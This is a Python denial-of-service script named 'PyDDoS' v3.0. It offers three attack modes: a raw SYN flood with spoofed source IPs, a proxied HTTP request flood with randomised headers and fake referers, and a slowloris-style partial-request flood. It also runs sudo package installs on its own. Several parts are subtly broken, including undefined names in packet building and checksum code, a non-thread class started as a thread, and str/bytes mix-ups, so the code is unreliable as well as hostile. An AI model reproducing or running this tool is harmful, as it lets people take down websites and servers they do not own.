#!/usr/bin/env python3

version= '3.0'
title = '''

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                    
 DDos python script | Script used for testing ddos | Ddos attack     
 Author: ___T7hM1___                                                
 Github: http://github.com/t7hm1/pyddos                             
 Version:'''+version+''' 
'''

import re
import os
import sys
import json
import time
import string
import signal
import http.client, urllib.parse
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser, RawTextHelpFormatter

if os.name == 'posix':
    c = os.system('which pip')
    if c == 256:
        os.system('sudo apt-get install python-pip')
    else:
        pass
else:
    print('[-] Check your pip installer')

try:
    import requests, colorama
    from termcolor import colored, cprint
except:
    try:
        if os.name == 'posix':
            os.system('sudo pip install colorama termcolor requests')
            sys.exit('[+] I have installed necessary modules for you')
        elif os.name == 'nt':
            os.system('pip install colorama requests termcolor')
            sys.exit('[+] I have installed necessary modules for you')
        else:
            sys.exit('[-] Download and install necessary modules')
    except Exception as e:
        print('[-]', e)
if os.name == 'nt':
    colorama.init()

signal.signal(signal.SIGFPE, signal.SIG_DFL)

def load_proxies():
    proxies = []
    try:
        with open('proxy.txt', 'r') as file:
            for line in file:
                proxy = line.strip()
                if proxy:
                    proxies.append(proxy)
    except FileNotFoundError:
        print('[-] No file named \'proxy.txt\', failed to load proxies')
    return proxies

def fake_ip():
    while True:
        ips = [str(randrange(0, 256)) for i in range(4)]
        if ips[0] == "127":
            continue
        fkip = '.'.join(ips)
        break
    return fkip

def check_tgt(args):
    tgt = args.d
    try:
        ip = gethostbyname(tgt)
    except:
        sys.exit(cprint('[-] Can\'t resolve host:Unknown host!', 'red'))
    return ip

def add_useragent():
    try:
        with open("./ua.txt", "r") as fp:
            uagents = re.findall(r"(.+)\n", fp.read())
    except FileNotFoundError:
        cprint('[-] No file named \'ua.txt\', failed to load User-Agents', 'yellow')
        return []
    return uagents

def add_bots():
    bots = []
    bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
    bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
    return bots

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        self.tgt = tgt
        self.port = port
        self.to = to
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST']
        self.pkt_count = 0

    def mypkt(self):
        text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' +\
              'Host:' + self.tgt + '\r\n' +\
              'User-Agent:' + choice(add_useragent()) + '\r\n' +\
              'Content-Length: 42\r\n'
        pkt = buffer(text)
        return pkt

    def building_socket(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
                self.pkt_count += 1
        except Exception:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            self.pkt_count += 3
            if sock:
                sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
                self.pkt_count += 1
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        return sock

    def sending_packets(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.sendall('X-a: b\r\n')
                self.pkt += 1
        except Exception:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            sock.settimeout(None)
            if sock:
                sock.sendall('X-a: b\r\n')
                self.pkt_count += 1
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))
        return sock

    def doconnection(self):
        socks = 0
        fail = 0
        lsocks = []
        lhandlers = []
        cprint('\t\tBuilding sockets', 'blue')
        while socks < (int(self.threads)):
            try:
                sock = self.building_socket()
                if sock:
                    lsocks.append(sock)
                    socks += 1
                    if socks > int(self.threads):
                        break
            except Exception:
                fail += 1
            except KeyboardInterrupt:
                sys.exit(cprint('[-] Canceled by user', 'red'))
        cprint('\t\tSending packets', 'blue')
        while socks < int(self.threads):
            try:
                handler = self.sending_packets()
                if handler:
                    lhandlers.append(handler)
                    socks += 1
                    if socks > int(self.threads):
                        break
                else:
                    pass
            except Exception:
                fail += 1
            except KeyboardInterrupt:
                break
                sys.exit(cprint('[-] Canceled by user', 'red'))
        time.sleep(self.sleep)

class Requester(Thread):
    def __init__(self, tgt, proxies):
        Thread.__init__(self)
        self.tgt = tgt
        self.port = None
        self.ssl = False
        self.req = []
        self.proxies = proxies
        self.lock = Lock()
        url_type = urllib.parse.urlparse(self.tgt)
        if url_type.scheme == 'https':
            self.ssl = True
            if self.ssl:
                self.port = 443
        else:
            self.port = 80

    def header(self):
        cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)), 'min-fresh=' + str(randint(0, 10)), 'notransform', 'only-if-cache']
        acceptEc = ['compress,gzip', '', '*', 'compress;q=0,5, gzip;q=1.0', 'gzip;q=1.0, indentity; q=0.5, *;q=0']
        acceptC = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
        bot = add_bots()
        c = choice(cachetype)
        a = choice(acceptEc)
        http_header = {
            'User-Agent': choice(add_useragent()),
            'Cache-Control': c,
            'Accept-Encoding': a,
            'Keep-Alive': '42',
            'Host': self.tgt,
            'Referer': choice(bot)
        }
        return http_header

    def rand_str(self):
        mystr = []
        for x in range(3):
            chars = tuple(string.ascii_letters + string.digits)
            text = (choice(chars) for _ in range(randint(7, 14)))
            text = ''.join(text)
            mystr.append(text)
        return '&'.join(mystr)

    def create_url(self):
        return self.tgt + '?' + self.rand_str()

    def data(self):
        url = self.create_url()
        http_header = self.header()
        return (url, http_header)

    def run(self):
        try:
            proxy = choice(self.proxies)
            proxy_dict = {"http": proxy, "https": proxy}
            while True:
                url, http_header = self.data()
                try:
                    requests.get(url, headers=http_header, proxies=proxy_dict)
                except requests.exceptions.RequestException:
                    pass
        except Exception:
            pass
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

class Synflood(Thread):
    def __init__(self, tgt, port, psize, rounds):
        Thread.__init__(self)
        self.tgt = tgt
        self.psize = psize
        self.port = port
        self.rounds = rounds
        self.lock = Lock()
        self.psize = psize

    def checksum(self):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i + 1])
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def Building_packet(self):
        packet = ''
        src_ip = fake_ip()
        dst_ip = self.tgt
        iphdr = ''
        src_port = randint(1024, 65535)
        dst_port = self.port
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = htons(5840)
        check = 0
        urg_prt = 0
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        user_data = b''
        tcp_header = pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
        source_address = inet_aton(src_ip)
        dest_address = inet_aton(dst_ip)
        placeholder = 0
        protocol = IPPROTO_TCP
        tcp_length = len(tcp_header) + len(user_data)
        psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header + user_data
        tcp_checksum = self.checksum()
        tcp_header = pack('!HHLLBBH', src_port, dst_port, seq, ack_seq, offset_res, tcp_flags, window) + pack('H', tcp_checksum) + pack('!H', urg_prt)
        packet = ip_header + tcp_header
        return packet

    def run(self):
        try:
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            while True:
                packet = self.Building_packet()
                sock.sendto(packet, (self.tgt, 0))
        except Exception:
            pass
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user', 'red'))

def main():
    proxies = load_proxies()
    parser = ArgumentParser(
        usage=print(title),
        formatter_class=RawTextHelpFormatter,
        epilog='''EXAMPLES:
    + Syn Flood: ./script.py -s [site] -p [port] -t [threads] -S
    + HTTP Flood: ./script.py -s [site] -p [port] -t [threads] -r [rounds] -R
    + Pyslow Flood: ./script.py -s [site] -p [port] -t [threads] -r [rounds] -T
        '''
    )
    parser.add_argument('-d', help='Domain/IP', required=True)
    parser.add_argument('-p', help='Port (default=80)', type=int, default=80)
    parser.add_argument('-t', help='Threads (default=100)', type=int, default=100)
    parser.add_argument('-r', help='Rounds (default=1)', type=int, default=1)
    parser.add_argument('-T', help='Pyslow attack mode', action='store_true')
    parser.add_argument('-S', help='Synflood attack mode', action='store_true')
    parser.add_argument('-R', help='Requester attack mode', action='store_true')
    parser.add_argument('-h', '--help', action='help', help='show this help message and exit')
    args = parser.parse_args()

    ip = check_tgt(args)
    tgt = args.d
    port = args.p
    threads = args.t
    rounds = args.r
    cprint('[+] Starting the attack...', 'green')

    if args.S:
        for i in range(int(threads)):
            Synflood(tgt, port, 65535, rounds).start()
    elif args.T:
        for i in range(int(threads)):
            Pyslow(tgt, port, 1, threads, rounds).start()
    elif args.R:
        for i in range(int(threads)):
            Requester(tgt, proxies).start()
    else:
        cprint('[+] Starting the attack...', 'green')
        for i in range(int(threads)):
            Requester(tgt, proxies).start()

if __name__ == '__main__':
    main()
